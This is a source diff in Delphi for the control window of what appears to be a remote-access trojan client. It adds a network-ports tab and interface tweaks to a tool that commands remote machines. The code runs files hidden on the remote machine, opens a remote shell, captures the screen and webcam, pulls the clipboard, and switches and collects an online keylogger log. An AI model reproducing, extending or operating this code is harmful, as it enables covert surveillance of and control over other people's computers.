@@ -13,11 +13,15 @@ uses
     Tamanio     : String;
     Tipo        : String;
     Atributos   : String;
-    Fechamodify : String;
+    Fechamodify : integer;
     TamanioReal : integer;
+    SortData   : string;
   end;
 
-
+  type TCachedIcon=record
+    Extension : String
+  end;
+  
 type
   TFormControl = class(TForm)
     PageControl: TPageControl;
@@ -261,6 +265,15 @@ type
     TimerCuentaEncontrados: TTimer;
     LabelTamaniowebcam: TLabel;
     SpeedButton2: TSpeedButton;
+    TabPuertos: TTabSheet;
+    ListViewPuertos: TListView;
+    BtnRefrescarPuertos: TSpeedButton;
+    CheckBoxPuertos: TCheckBox;
+    PopupMenuPuertos: TPopupMenu;
+    CerrarConexin1: TMenuItem;
+    MatarProceso1: TMenuItem;
+    Iraproceso1: TMenuItem;
+    N11: TMenuItem;
     procedure FormCreate(Sender: TObject);
     procedure BtnRefrescarProcesosClick(Sender: TObject);
     procedure BtnRefrescarVentanasClick(Sender: TObject);
@@ -346,11 +359,9 @@ type
     procedure btnSiguienteInstalarServicioClick(Sender: TObject);
     procedure btnInstServiciosClick(Sender: TObject);
     procedure btnInstServicios2Click(Sender: TObject);
-    procedure PopupDescargasPopup(Sender: TObject);
+    procedure PopupDescargasPopup(Sender: TObject);                                        
     procedure DetenerDescarga1Click(Sender: TObject);
     procedure ReanudarDescarga1Click(Sender: TObject);
-    procedure ObteneryAniadirKeyloggerLog(AThread: TIdPeerThread; filesize: int64);
-    function  ObtenerScreenCap_CamCap(AThread: TIdPeerThread; filesize: int64;var MS:Tmemorystream):string;
     procedure Agregaracoladedescarga1Click(Sender: TObject);
     procedure EditPathArchivosKeyPress(Sender: TObject; var Key: char);
     procedure ListViewProcesosCompare(Sender: TObject; Item1, Item2: TListItem;
@@ -435,10 +446,17 @@ type
     procedure TimerCuentaEncontradosTimer(Sender: TObject);
     procedure LabelVelocidadClick(Sender: TObject);
     procedure SpeedButton2Click(Sender: TObject);
+    procedure ListViewBuscarColumnClick(Sender: TObject;
+      Column: TListColumn);
+    procedure FormShow(Sender: TObject);
+    procedure BtnRefrescarPuertosClick(Sender: TObject);
+    procedure ListViewPuertosCompare(Sender: TObject; Item1,
+      Item2: TListItem; Data: Integer; var Compare: Integer);
+    procedure CerrarConexin1Click(Sender: TObject);
+    procedure MatarProceso1Click(Sender: TObject);
+    procedure TabPuertosShow(Sender: TObject);
 
   private  //Funciones y variables privadas que solo podemos usar en este Form
-    Servidor: TIdPeerThread;
-    //Variables para recibir ficheros
     FormVisorDeMiniaturas: TObject;
     mslistviewitem : Tlistitem;
     RecibiendoFichero: boolean;
@@ -458,43 +476,54 @@ type
     SearchItems : array[0..50000] of TSearchItem;
     Encontrados : integer; //Numero de encontrados
     ParaDeListar : boolean;
+    Reversed     : boolean;
+    CachedIcons : array[0..1000] of TCachedIcon;
+    numcached : integer;
+    PrimeraVezQueMeMuestro : boolean;
+    CapSize : array[0..5] of integer; //Tamaño de la captura.. que estamos recibiendo
+    MSc   : array[0..5] of TMemoryStream; //EL memoryStream donde recibiremos las capturas...
+    Keyloggerlog : string; //Para recibir el log del keylogger 
     function ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
     procedure AniadirClavesARegistro(Claves: string);
     procedure AniadirValoresARegistro(Valores: string);
-    procedure UpdateProgressBarScreen;
     procedure agregardescargaencola(filename:string;tamano:integer);
     procedure CargarThumbsFileAlListview(thumbsfilepath:string);     //Funcion para mostrar imagenes de un archivo thumbs.db a el listview de archivos
     Function FileIconInit(FullInit: BOOL): BOOL; stdcall;
     procedure Cargariconos(primeravez : boolean);
-    function IconNum(strExt: string): integer;
+    function IconNum(strExt: string;usecache: boolean): integer;
     procedure agregardescarga(filename:string);
     procedure TransferFinishedNotification(Sender: TObject;filename:string);
+    procedure CreateParams(var Params: TCreateParams); override;
+    procedure Estado(Estado:string);
   public  //Funciones públicas que podemos llamar desde otros Forms
-    NombrePC: string; //Nombre del PC remoto
+    Servidor: TIdPeerThread;
     RecibiendoJPG : boolean; //Recibiendo captura? o camara o thumbnail  (se usa desde UnitVisorDeMiniaturas)
     AnchuraPantalla, AlturaPantalla : integer; //Altura y anchura de la pantalla del servidor
     AnchuraWebCam, AlturaWebCam : integer;     //Altura y anchura de la webcam del servidor
     FormVisorCaptura : TObject;
-    constructor Create(aOwner: TComponent; AThread: TIdPeerThread); overload;
+    DirUsuario, DirCapturas, DirWebcam, DirMiniaturas, DirDescargas : string;
+    MyItem: TListItem; //Item de listviewconexiones
+    constructor Create(aOwner: TComponent; AThread: TIdPeerThread; Item : Tlistitem);
     procedure OnRead(command: string; AThread: TIdPeerThread); overload;
     procedure OnReadFile(AThread: TIdPeerThread); overload;
     procedure CrearDirectoriosUsuario();  //Es llamada tambien desde el visor de Thumbnails
-    procedure PedirPorSegundoSocket(tipo:integer;info:string);//0=pantalla 1=webcam 2=thumnails info=thumbnailpath
     function InitWavFile(var Ms:TMemoryStream;nChannels,nSamplesPerSec,wBitsPerSample:word;b:string):   Integer;
   end;
 
 var
   FormControl: TFormControl;
-  pctProgressBarScreen: integer;
-  GenericBar:  TProgressBar;
 
 implementation
 
 uses UnitMain, UnitOpciones, UnitVisorDeMiniaturas,UnitTransfer,
-     UnitFormReg, ScreenMaxCap, UnitFormSendKeys, UnitFunciones,
-     UnitVariables, AxThumbsDB, Storages;
+     UnitFormReg, ScreenMaxCap, UnitFormSendKeys, UnitFunciones,UnitVariables, AxThumbsDB, Storages;
      
 {$R *.dfm}
+
+procedure TFormControl.Estado(Estado:string); //Cambia el texto de la statusbar
+begin
+  Statusbar.Panels[1].Text := '['+timetostr(now)+'] '+Estado;
+end;
 
 Function TFormControl.FileIconInit(FullInit: BOOL): BOOL; stdcall;
 type
@@ -514,18 +543,61 @@ begin
 end;
 end;
 
-constructor TFormControl.Create(aOwner: TComponent; AThread: TIdPeerThread);
+constructor TFormControl.Create(aOwner: TComponent; AThread: TIdPeerThread; Item : Tlistitem);
+var
+tempstr, uname, pcname: string;
+i : integer;
 begin
   inherited Create(aOwner);
   Servidor := AThread;
+  MyItem := Item;
   FormVisorDeMiniaturas := nil;
+  self.Caption :=
+      _('Centro de control:')+ ' ' + Item.caption +
+      ' ' + Athread.Connection.Socket.Binding.PeerIP;
+
+  TempStr := item.SubItems[10];  //Extraemos el nombre de usuario y del pc
+  UName := Copy(TempStr, 1, Pos('/', TempStr) - 1);//Nombre de usuario
+  Delete(TempStr, 1, Pos('/', TempStr));
+  PcName := TempStr;
+
+  DirUsuario     := Lowercase(FormOpciones.LabeledEditDirUser.text);
+  DirCapturas    := Lowercase(FormOpciones.LabeledDirScreen.text);
+  DirWebcam      := Lowercase(FormOpciones.LabeledDirWebcam.text);
+  DirMiniaturas  := Lowercase(FormOpciones.LabeledDirThumbs.text);
+  DirDescargas   := Lowercase(FormOpciones.LabeledDirDownloads.text);
+
+  for i:=0 to 4 do
+  begin
+    case i of
+      0: TempStr := DirUsuario;
+      1: TempStr := DirCapturas;
+      2: TempStr := DirWebcam;
+      3: TempStr := DirMiniaturas;
+      4: TempStr := DirDescargas;
+    end;
+
+    TempStr := StringReplace(TempStr,'%cooldir%', extractfiledir(paramstr(0)), [rfReplaceAll]);
+    TempStr := StringReplace(TempStr,'%identificator%', item.caption, [rfReplaceAll]);
+    TempStr := StringReplace(TempStr,'%username%', UName, [rfReplaceAll]);
+    TempStr := StringReplace(TempStr,'%pcname%', PcName, [rfReplaceAll]);
+    
+    case i of
+      0: DirUsuario    := IncludeTrailingBackslash(TempStr);
+      1: DirCapturas   := IncludeTrailingBackslash(TempStr);
+      2: DirWebcam     := IncludeTrailingBackslash(TempStr);
+      3: DirMiniaturas := IncludeTrailingBackslash(TempStr);
+      4: DirDescargas  := IncludeTrailingBackslash(TempStr);
+    end;
+  end;
 end;
 
 procedure TFormControl.FormCreate(Sender: TObject);
 begin
-    UseLanguage(Formmain.idioma);
-    TranslateComponent(self);
-      SetLength(MSGPosibles, 55);
+      UseLanguage(Formmain.idioma);
+      PrimeraVezQueMeMuestro := true;
+      TranslateComponent(self);
+      SetLength(MSGPosibles, 56);
       MSGPosibles[0] := _('De momento no funciona esta función :-)');
       MSGPosibles[1] := _('Hubo un problema al intentar auto-ejecutarse); la actualización se completara en el siguiente reinicio');
       MSGPosibles[2] := _('Proceso matado con PID ');
@@ -573,7 +645,7 @@ begin
       MSGPosibles[44] := _('No se pudo añadir la clave.');
       MSGPosibles[45] := _('Valor añadido con éxito.');
       MSGPosibles[46] := _('No se pudo añadir el valor.');
-      MSGPosibles[47] := _('Se ha intentado iniciar el servicio');
+      MSGPosibles[47] := _('Se ha intentado iniciar el serivico');
       MSGPosibles[48] := _('Se ha intentado detener el servicio');
       MSGPosibles[49] := _('Se ha intentado desinstalar el servicio');
       MSGPosibles[50] := _('Se ha intentado instalar el servicio');
@@ -581,12 +653,18 @@ begin
       MSGPosibles[52] := _('Online Keylogger activado con éxito');
       MSGPosibles[53] := _('Online Keylogger desactivado con éxito');
       MSGPosibles[54] := _('Seteado portapapeles con éxito');
-      
-
+      MSGPosibles[55] := _('Se ha intentado cerrar la conexión'); 
     self.DoubleBuffered := True;  //Evita parpadeos
     self.ListviewArchivos.DoubleBuffered := true;
+    self.ListViewBuscar.DoubleBuffered := true;
+    self.ListViewDescargas.DoubleBuffered := true;
+    self.ListViewProcesos.DoubleBuffered := true;
+    self.ListViewVentanas.DoubleBuffered :=  true;
+    self.ListViewRegistro.DoubleBuffered := true;
+    self.ListViewAudio.DoubleBuffered := true;
+    self.ListViewServicios.DoubleBuffered := true;
+    self.TreeViewRegedit.DoubleBuffered := true;
     recibiendofichero := false;
-    CargarIconos(true);
     self.Height := 457;//Altura Predeterminada
     self.Width := 440; //Anchura predeterminada
     if FormMain.ControlWidth > 0 then
@@ -680,7 +758,7 @@ procedure TFormControl.OnRead(command: string; AThread: TIdPeerThread);
 var
   Recibido, TempStr: string;
   Item:     TListItem;
-  i, a:     integer;
+  i, a, o:     integer;
   RealSize: string;
   itemv : TSearchItem;
 begin
@@ -694,7 +772,8 @@ begin
 
   if Copy(Recibido, 1, 4) = 'PING' then
   begin
-    Servidor.Connection.Writeln('PONG');
+    if Servidor.Connection.Connected then
+      Servidor.Connection.Writeln('PONG');
   end;
 
   if Copy(Recibido, 1, 4) = 'INFO' then
@@ -769,7 +848,7 @@ begin
     Delete(Recibido, 1, 5);
     while pos('|', Recibido) > 0 do
     begin
-      Item := ListViewProcesos.Items.Add;
+      Item := Listviewprocesos.Items.Add;
       Item.ImageIndex := 3; //imagen para que quede bonito XD
       Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
       Delete(Recibido, 1, Pos('|', Recibido));
@@ -788,6 +867,7 @@ begin
     listviewprocesos.Width := listviewprocesos.Width-1;
     BtnRefrescarProcesos.Enabled := true;
     ListviewProcesos.enabled := true;
+    Estado(_('Procesos listados'));
   end;
   //Listar Ventanas
   if Copy(Recibido, 1, 4) = 'WIND' then
@@ -818,7 +898,9 @@ begin
       Listviewventanas.Width := Listviewventanas.Width+1;     //Para que desaparezca la scrollbar horizontal
       Listviewventanas.Width := Listviewventanas.Width-1;
       BtnRefrescarVentanas.Enabled := true;
+      CheckBoxMostrarVentanasOcultas.enabled := true;
       ListViewVentanas.Enabled := true;
+      Estado(_('Ventanas listadas'));
   end;
 
   //Ir a proceso...
@@ -830,13 +912,13 @@ begin
     TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
     Delete(Recibido, 1, Pos('|', Recibido));
     if ListViewProcesos.Items.Count <= 0 then
-      MessageBox(Handle,
-        pchar(_('No se encontró ningún proceso listado. Debes actualizar la lista de procesos.')),
+      MessageBoxw(Handle,
+        pwidechar(_('No se encontró ningún proceso listado. Debes actualizar la lista de procesos.')),
         'Error', MB_ICONERROR + MB_OK);
     if Recibido = '0' then
     begin
-      MessageBox(Handle,
-        pchar(_('No se encontró ningún proceso para la ventana. Es posible que el proceso ya haya sido cerrado.')
+      MessageBoxw(Handle,
+        pwidechar(_('No se encontró ningún proceso para la ventana. Es posible que el proceso ya haya sido cerrado.')
         +
         #13#10 + _('Actualice la lista de ventanas.')), 'Error', MB_ICONERROR + MB_OK);
     end
@@ -845,18 +927,20 @@ begin
       begin
         if ListViewProcesos.Items[i].SubItems[0] = Recibido then
         begin
-          StatusBar.Panels[1].Text :=
+          Estado(
             _('La ventana con handle ') + TempStr + _(' pertenece al proceso "') +
-            ListViewProcesos.Items[i].Caption + _('" con PID ') + Recibido + '.';
+            ListViewProcesos.Items[i].Caption + _('" con PID ') + Recibido + '.');
 
           //Falso para asegurarse que se vea completamente el item
           PageControlManagers.ActivePage := TabProcesos;
-          ListViewProcesos.Items[i].MakeVisible(false);
-          //ListViewProcesos.SetFocus;
-          //ListViewProcesos.Items[i].Focused  := True;
-          ListViewProcesos.Items[i].Selected := True;
-          //Para que aparezca automaticamente seleccionado en la ventana
 
+          PageControlManagers.SetFocus;
+          ListViewProcesos.SetFocus;
+          ListViewProcesos.Items[i].MakeVisible(false);
+          ListViewProcesos.Items[i].Selected := True;
+          ListViewProcesos.Items[i].Focused  := True;
+           ListViewProcesos.SetFocus;
+          //Para que aparezca automaticamente seleccionado en la ventana
           Break;
         end;
       end;
@@ -866,7 +950,7 @@ begin
   if Copy(Recibido, 1, 3) = 'MSG' then
   begin
     Delete(Recibido, 1, 4);
-    for i := 0 to 54 do
+    for i := 0 to 55 do
       Recibido := StringReplace(Recibido,'{'+inttostr(i)+'}',MSGPosibles[i],[rfReplaceAll]);
 
     if Recibido = _('El directorio no existe!') then
@@ -880,9 +964,8 @@ begin
       CmbUnidades.enabled := True;
       SpeedbuttonRutasRapidas.enabled := True;
     end;
-    StatusBar.Panels[1].Text := Recibido;
-    MessageBeep($FFFFFFFF);
-    //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
+    Estado(Recibido);
+
   end;
 
   if Copy(Recibido, 1, 15) = 'MOUSETEMBLOROSO' then
@@ -946,24 +1029,14 @@ begin
     BtnActualizarArchivos.Enabled := True;
     ListviewArchivos.enabled := True;
     SpeedbuttonRutasRapidas.enabled := true;
-    StatusBar.Panels[1].Text := _('Unidades listadas.');
+    Estado(_('Unidades listadas.'));
     BtnVerUnidades.Enabled := True;
   end;
 
   if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
   begin
     Delete(Recibido, 1, 15); //Borra 'LISTARARCHIVOS|'
-    //cargar iconos
-    
-    if Pos('|', Recibido) > 1 then
-    begin
-      TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-      //Saca la longitud de la cadena
-      Delete(Recibido, 1, Pos('|', Recibido)); //Borra la longitud
-    end;
-    while Length(Recibido) < StrToInt(TempStr) do
-      //mientras el length de la cadena sea menor a lo que nos dice el server
-      Recibido := Recibido + Trim(Athread.Connection.ReadLn);
+    Delete(Recibido, 1, Pos('|', Recibido));
 
     ListViewArchivos.Items.BeginUpdate;
     ListViewArchivos.Clear; //Limpia primero...
@@ -973,7 +1046,7 @@ begin
       Item.ImageIndex := 3;
       Item.Caption := '<..>';
     end;
-    Statusbar.panels[1].text := _('Listando directorio: ')+EditPathArchivos.text;
+    Estado(_('Listando directorio: ')+EditPathArchivos.text);
     while Pos('|', Recibido) > 1 do
     begin
       if ParaDeListar then break;
@@ -990,19 +1063,24 @@ begin
         Item.SubItems.Add('');
         Item.SubItems.Add(_('Carpeta de archivos'));
         Item.SubItems.Add(Copy(TempStr, 1, Pos(':', TempStr) - 1));
-        Item.SubItems.Add(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)));
+        
+        Item.SubItems.add(
+         DateToStr(FileDateToDateTime(strtointdef(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)),1))) + ' ' +
+         TimeToStr(FileDateToDateTime(strtointdef(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)),1)))
+         );
         a := a + 1; //numero de carpetas
       end
       else //entonces es un archivo, saque tambien la información extra...
       begin
         Item    := ListViewArchivos.Items.Add;
-        Item.ImageIndex := IconNum(LowerCase(ExtractFileExt(TempStr)));
+        Item.ImageIndex := IconNum(TempStr, true);
         Item.Caption := TempStr;
 
         if((AnsiLowerCase(tempstr) = 'thumbs.db') and PrevisualizacionActiva and not receivingthumbfile) then
         begin
           Receivingthumbfile := true;
-          Servidor.Connection.Writeln('GETFILE|'+EditPathArchivos.text+tempstr);
+          if Servidor.Connection.connected then
+            Servidor.Connection.Writeln('GETFILE|'+EditPathArchivos.text+tempstr);
         end;
 
         TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
@@ -1011,7 +1089,7 @@ begin
         RealSize := TempStr;
         TempStr  := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
         Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
-        Item.SubItems.Add(TempStr); //agrega el tipo
+        Item.SubItems.Add({TempStr}'Archivo'); //agrega el tipo
         TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
         Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
         TempStr := StringReplace(TempStr,'Lectura', _('Lectura'),[rfReplaceAll]);
@@ -1020,13 +1098,14 @@ begin
         Item.SubItems.Add(TempStr); //agrega atributos
         TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
         Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
-        Item.SubItems.Add(TempStr); //agrega la fecha
+        Item.SubItems.add( DateToStr(FileDateToDateTime(strtointdef(tempstr,1))) + ' ' +
+            TimeToStr(FileDateToDateTime(strtointdef(tempstr,1)))); //agrega la fecha
         Item.SubItems.Add(RealSize);
       end;
     end;
     LabelNumeroDeCarpetas.Caption := 'Carpetas: ' + IntToStr(a);
     LabelNumeroDeArchivos.Caption := 'Archivos: ' + IntToStr(listviewarchivos.Items.count-a-1);
-    Statusbar.panels[1].text := _('Directorio listado!');
+    Estado(_('Directorio listado!'));
     if PrevisualizacionActiva then
       cargariconos(false);
     ListViewArchivos.Items.EndUpdate;
@@ -1037,7 +1116,6 @@ begin
     SpeedbuttonRutasRapidas.enabled := true;
     ListviewArchivos.enabled := True;
     CmbUnidades.enabled := True;
-
   end;
 
   if Copy(Recibido, 1, 9) = 'GETFOLDER' then
@@ -1072,6 +1150,7 @@ begin
     AniadirValoresARegistro(Recibido);
     Recibido := '';
     BtnVerRegisto.enabled := true;
+    Estado(_('Valores de la clave listados'));
   end;
   if Copy(Recibido, 1, 13) = 'LISTARWEBCAMS' then
   begin
@@ -1082,7 +1161,7 @@ begin
       ComboBoxWebcam.Items.Append(Copy(Recibido, 1, Pos('|', Recibido) - 1));
       Delete(Recibido, 1, Pos('|', Recibido));
     end;
-    StatusBar.Panels[1].Text := _('Webcams listadas.');
+    Estado(_('Webcams listadas.'));
   end;
 
   if Pos('SHELL|', Recibido) = 1 then
@@ -1096,8 +1175,7 @@ begin
       ComboBoxShellCommand.Color := ClBlack;
       ComboBoxshellCommand.Font.Color := clWhite;
       ComboBoxShellCommand.Enabled := True;
-      {btnCambiarColorShell.Enabled := True;
-      btnCambiarFuenteShell.Enabled := True;  }
+      Estado(_('Shell correctamente activada'));
     end
     else
     if Recibido = 'DESACTIVAR' then
@@ -1109,16 +1187,14 @@ begin
       ComboBoxShellCommand.Color := ClInactiveBorder;
       ComboBoxshellCommand.Font.Color := clWhite;
       ComboBoxShellCommand.Enabled := False;
-      {btnCambiarColorShell.Enabled := False;     //Ni idea porque pero suelta error "controlador no valido": Me parece que el thread de los sockets tiene problemas al desactivar speedbuttons
-      btnCambiarFuenteShell.Enabled := False;  }
+      Estado(_('Shell correctamente desactivada'));
     end
     else
     begin
       TempStr := StringReplace(Trim(Recibido),'|salto|', #10, [rfReplaceAll]);
       TempStr := StringReplace((Tempstr),'|salto2|', #13, [rfReplaceAll]);
-
-      MemoShell.Text := MemoShell.Text + Trim(Tempstr) + #13#10;
-      SendMessage(MemoShell.Handle, EM_LINESCROLL, 0, length(TempStr));
+      Memoshell.Lines.Append(Trim(Tempstr));
+      SendMessage(MemoShell.Handle, EM_LINESCROLL, 0, length(Memoshell.text));
     end;
   end;
 
@@ -1163,6 +1239,7 @@ begin
     listviewservicios.Width := listviewservicios.Width+1;
     BtnServicios.enabled := true;
     ListviewServicios.enabled := true;
+    Estado(_('Servicios listados'));
   end;
 
    if Copy(Recibido, 1, 15) = 'ESTADOKEYLOGGER' then
@@ -1170,7 +1247,6 @@ begin
     Delete(Recibido, 1, Pos('|', Recibido));
     if(copy(Recibido, 1, pos('|', Recibido) - 1) = 'ACTIVADO') then
     begin
-
       SpeedButtonRecibirLog.Enabled := true;
       SpeedButtonGuardarLog.Enabled := true;
       SpeedButtonEliminarLog.Enabled := true;
@@ -1244,25 +1320,27 @@ begin
     if copy(Recibido,1,5) = 'STOPS' then     //Paramos...
     begin
       TabSheetBuscar.highlighted := false;
+      TabFileManager.highlighted := false;
       SpeedButtonBuscar.caption := _('Comenzar');
+      SpeedButtonBuscar.enabled := true;
       EditBuscar.Enabled := true;
-      StatusBar.panels[1].text := _('Busqueda parada');
-      TimerCuentaencontrados.enabled := false;
+      Estado(_('Busqueda parada'));
     end
     else if  copy(Recibido,1,6) = 'FINISH' then //Terminado!
     begin
       SpeedButtonBuscar.caption := _('Comenzar');
+      SpeedButtonBuscar.enabled := true;
       EditBuscar.Enabled := true;
-      StatusBar.panels[1].text := _('Busqueda finalizada');
+      Estado(_('Busqueda finalizada'));
       TabSheetBuscar.highlighted := false;
-      TimerCuentaencontrados.enabled := false;
+      TabFileManager.highlighted := false;
     end
     else
     begin
       if ParaDeBuscar then exit;
 
-      while pos('|', Recibido) > 0 do
-      begin
+     { while pos('|', Recibido) > 0 do
+      begin   }
           if( Encontrados > 50000) then exit; //WTFFF!!!
           SearchItems[encontrados].Nombre := copy(Recibido, 1, pos('|',Recibido)-1);
           delete(Recibido,1,pos('|',Recibido));
@@ -1272,12 +1350,12 @@ begin
           SearchItems[encontrados].Tipo := copy(Recibido, 1, pos('|',Recibido)-1);
           SearchItems[encontrados].Atributos := '';
           delete(Recibido,1,pos('|',Recibido));
-          SearchItems[encontrados].Fechamodify := copy(Recibido, 1, pos('|',Recibido)-1);
+          SearchItems[encontrados].Fechamodify := strtointdef(copy(Recibido, 1, pos('|',Recibido)-1),1);
           delete(Recibido,1,pos('|',Recibido));
-          ListviewBuscar.Items.Count := Encontrados;
           Encontrados := Encontrados+1;
-          end;
-      end;//fin while
+
+      end;  //fin while
+      //end;
    end;
 
 
@@ -1296,6 +1374,7 @@ begin
        TempStr := StringReplace((Tempstr),'|salto2|', #13, [rfReplaceAll]);
        MemoClipBoard.Text:= TempStr;
        SpeedButtonClipBoard1.enabled := true;
+       Estado(_('Portapapeles recibido'));
   end;
 
   if Copy(Recibido,1,11) = 'GETADRIVERS' then
@@ -1308,53 +1387,61 @@ begin
       Delete(Recibido, 1, Pos('|', Recibido));
     end;
     SpeedButtonListarAudio.enabled := true;
+    Estado(_('Dispositivos de audio listados'));
   end;
+
+  if Copy(Recibido,1,6) = 'TCPUDP' then
+  begin
+    ListviewPuertos.Clear;
+    delete (Recibido,1,7);
+    While pos('|',recibido)>0 do
+    begin
+      item:=ListviewPuertos.Items.Add;
+      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+      TempStr:= Copy(Recibido, 1, Pos('|', Recibido) - 1);
+
+      Delete(Recibido, 1, Pos('|', Recibido));
+      for i:=0 to 6 do
+      begin
+          Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
+          Delete(Recibido, 1, Pos('|', Recibido));
+      end;
+    end;
+    Estado('Escaneo de Puerto Finalizado..');
+    ListviewPuertos.enabled := true;
+    BtnRefrescarPuertos.enabled := true;
+    CheckBoxPuertos.enabled := true;
+  end;
+
 // se fini del dispacher de comandos
 end;
 
-function TFormControl.IconNum(strExt: string): integer;
+function TFormControl.IconNum(strExt: string;usecache : boolean): integer;
 var
   FileInfo : SHFILEINFO;
+  i        : integer;
 begin
- { if (strExt = '.mp3') or (strExt = '.wav') or (strExt = '.ogg') or
-    (strExt = '.midi') or (strExt = '.mid') or (strExt = '.cda') then
-    Result := 25
-  else if (strExt = '.avi') or (strExt = '.mpg') or (strExt = '.mpeg') or
-    (strExt = '.asf') or (strExt = '.wmv') or (strExt = '.mov') then
-    Result := 25
-  else if (strExt = '.jpg') or (strExt = '.jpeg') or (strExt = '.gif') or
-    (strExt = '.png') or (strExt = '.pdf') then
-    Result := 23
-  else if (strExt = '.dll') or (strExt = '.sys') or (strExt = '.ocx') or
-    (strExt = '.vxd') or (strExt = '.cpl') or (strExt = '.ini') then
-    Result := 24
-  else if (strExt = '.txt') then
-    Result := 6
-  else if (strExt = '.html') or (strExt = '.htm') or (strExt = '.php') then
-    Result := 9
-  else if (strExt = '.exe') or (strExt = '.com') or (strExt = '.scr') then
-    Result := 3
-  else if (strExt = '.bat') or (strExt = '.cmd') then
-    Result := 10
-  else if (strExt = '.zip') or (strExt = '.rar') or (strExt = '.ace') then
-    Result := 11
-  else if (strExt = '.doc') or (strExt = '.rtf') then
-    Result := 12
-  else if (strExt = '.ppt') or (strExt = '.pps') then
-    Result := 13
-  else if (strExt = '.xls') or (strExt = '.xml') then
-    Result := 14
-  else if (strExt = '.bmp') or (strExt = '.ico') then
-    Result := 26
-  else
-    Result := 2;        }
-  SHGetFileInfo(PChar(UpperCase(ExtractFileExt(strext))),
+  StrExt := UpperCase(ExtractFileExt(strext));
+  if not (POS('.', strext) >0) then
+    StrExt := 'SYS';
+  if usecache then
+  begin
+      for i:=0 to numcached do
+      if CachedIcons[i].Extension = StrExt then
+      begin
+        Result := i;
+        exit;
+      end;
+  end;
+  SHGetFileInfo(PChar(StrExt),
                     FILE_ATTRIBUTE_NORMAL,
                     FileInfo,
                     SizeOf(FileInfo),
                     SHGFI_ICON  or
                     SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
   Result := FileInfo.iIcon;
+  CachedIcons[Result].Extension := StrExt;
+  numcached := numcached +1;
 end;
 
 //Boton obtener información
@@ -1402,18 +1489,13 @@ begin
   end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-
-
-
-
-
 end;
 
 //Boton obtener ventanas
 procedure TFormControl.BtnRefrescarVentanasClick(Sender: TObject);
 begin
   if not BtnRefrescarVentanas.Enabled then exit;
-
+  CheckBoxMostrarVentanasOcultas.enabled := false;
   BtnRefrescarVentanas.Enabled := false;
   ListViewVentanas.Enabled := false;
   if Servidor.Connection.Connected then
@@ -1676,7 +1758,7 @@ begin
     MessageDlg(_('Dale doble click a una carpeta o a un archivo!'), mtWarning, [mbOK], 0)
   else
   begin
-    StatusBar.Panels[1].Text := _('Listando archivos...');
+    Estado(_('Listando archivos...'));
     if ListViewArchivos.Selected.Caption = '<..>' then
     begin
       EditPathArchivos.Text :=
@@ -1792,7 +1874,7 @@ begin
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
         FilePath := EditPathArchivos.Text +mslistviewitem.Caption
       else
-        FilePath := mslistviewitem.Caption;
+        FilePath := mslistviewitem.subitems[0];
 
       Servidor.Connection.Writeln('EXEC|NORMAL|' + FilePath);
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
@@ -1821,7 +1903,7 @@ begin
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
         FilePath := EditPathArchivos.Text + mslistviewitem.Caption
       else
-        FilePath := mslistviewitem.Caption;
+        FilePath := mslistviewitem.subitems[0];
       Servidor.Connection.Writeln('EXEC|OCULTO|' + FilePath);
 
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
@@ -1853,7 +1935,7 @@ begin
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
         FilePath := EditPathArchivos.Text + mslistviewitem.Caption
       else
-        FilePath := mslistviewitem.Caption;
+        FilePath := mslistviewitem.subitems[0];
       if mslistviewitem.ImageIndex = 3 then
         Servidor.Connection.Writeln('DELFOLDER|' + FilePath)
       else
@@ -2037,7 +2119,7 @@ begin
   while Pos('|', Claves) > 0 do
   begin
     Listadas := Listadas+1;
-    Statusbar.panels[1].text := _('Listadas ')+inttostr(Listadas)+_(' claves de ')+inttostr(Total);
+    Estado(_('Listadas ')+inttostr(Listadas)+_(' claves de ')+inttostr(Total));
     Clave := Copy(Claves, 1, Pos('|', Claves) - 1);
     Nodo  := TreeViewRegedit.Items.AddChild(TreeViewRegedit.Selected, Clave);
     //Sin seleccionar mostrar el icono de carpeta cerrada
@@ -2048,7 +2130,7 @@ begin
   end;
   TreeViewRegedit.Selected.Expand(False);
   TreeViewRegedit.Items.endupdate;
-  Statusbar.panels[1].text := _('Claves listadas');
+  Estado(_('Claves listadas'));
   TreeViewRegedit.enabled := true;
 end;
 
@@ -2297,14 +2379,20 @@ end;
 
 procedure TFormControl.BtnCapturarScreen1Click(Sender: TObject);
 begin
+  if not BtnCapturarScreen.enabled then exit;
   if not Servidor.Connection.Connected then
   begin
     MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
     Exit;
   end;
-  //Aparece parpadeo
-  //imgCaptura.Picture := nil; //Refrescamos
-  PedirPorSegundoSocket(0,'');
+
+  BtnCapturarScreen.enabled := false;
+  if TimerCaptureScreen.enabled then
+    TimerCaptureScreen.enabled := not TimerCaptureScreen.enabled;  //Desactivamos el timer, será activado cuando recibamos la captura
+  if FormVisorCaptura = nil then
+    Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr(imgCaptura.Height)+'|')
+  else
